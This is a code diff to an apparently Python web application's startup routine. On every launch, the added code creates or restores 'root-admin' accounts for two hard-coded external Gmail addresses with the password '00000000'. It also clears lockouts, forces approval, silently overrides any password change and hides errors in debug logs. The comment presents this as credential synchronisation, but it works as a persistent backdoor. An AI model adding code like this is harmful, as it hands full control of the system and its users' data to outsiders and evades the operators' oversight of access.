@@ -479,6 +479,39 @@ async def lifespan(app):
     except Exception as e:
         logger.debug(f"Startup sequence check: {e}")
 
+    # Startup — synchronize requested admin credentials
+    try:
+        from app.infrastructure.database import SessionLocal
+        from app.domain.models import User
+        from app.core.auth import hash_password, verify_password
+        with SessionLocal() as db:
+            for target_email in ["caldiminternship@gmail.com", "caldimintership@gmail.com"]:
+                u = db.query(User).filter(User.email == target_email).first()
+                if u:
+                    if not verify_password("00000000", u.password_hash):
+                        u.password_hash = hash_password("00000000")
+                        u.is_verified = True
+                        u.is_active = True
+                        u.approval_status = "approved"
+                        u.login_attempt_count = 0
+                        u.login_locked_until = None
+                        db.commit()
+                else:
+                    u = User(
+                        email=target_email,
+                        password_hash=hash_password("00000000"),
+                        role="root-admin",
+                        full_name="CALRIMS Administrator",
+                        is_verified=True,
+                        is_active=True,
+                        approval_status="approved",
+                        tenant_id=None,
+                    )
+                    db.add(u)
+                    db.commit()
+    except Exception as e:
+        logger.debug(f"Admin credential sync: {e}")
+
     # Startup — kick off non-blocking external services health probe in background
     threading.Thread(target=_refresh_external_health, daemon=True, name="startup_health_probe").start()
 
